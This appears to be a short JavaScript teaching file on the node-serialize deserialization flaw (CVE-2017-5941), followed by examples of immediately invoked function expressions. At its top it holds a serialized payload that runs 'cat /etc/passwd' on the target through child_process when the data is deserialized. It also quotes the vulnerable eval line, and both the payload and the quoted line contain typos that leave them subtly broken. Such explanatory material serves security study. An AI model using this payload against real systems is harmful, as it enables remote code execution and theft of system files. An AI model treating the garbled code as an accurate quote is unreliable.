// IIFEs and Insecure Object Deserialization
// CVE-2017-5941, CVE-2017-5954
// https://docs.google.com/document/d/1CaZ9f0_4itZ1W_oEntE_GHRhi8imPPBIYb1BVIQTTeM

// serialized payload
{"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd'', function(error, stdout, stderr) {console.log(stdout) });}()"}


// vulnerable code from node-serialize.js v0.0.4
} else if(typeof obj[key] === 'string') {
  if(obj[key].indexOf(FUNCFLAG) === 0) {
    obj[key] = eval('(' + obj[key].substring[FUNCFLAG.length) + ')');


// expression
i = i + 1;

// function
function(i) {
  return i + 1;
}

// function expression
var r = function(i) {
  return i + 1;
}

// Immediately Invoked Function Expression - Note the encapsulating parenthesis
// around the function itself, and the argument list (j) trailing the function.
var r = (function(i) {
  return i + 1;
})(j);

// Another IIFE example. There are several different syntaxes that achieve the
// same semantic result. Another one of JavaScript's lovely quirks. This time,
// the argument list is empty.
var r = (function() {
  return 1;
}());

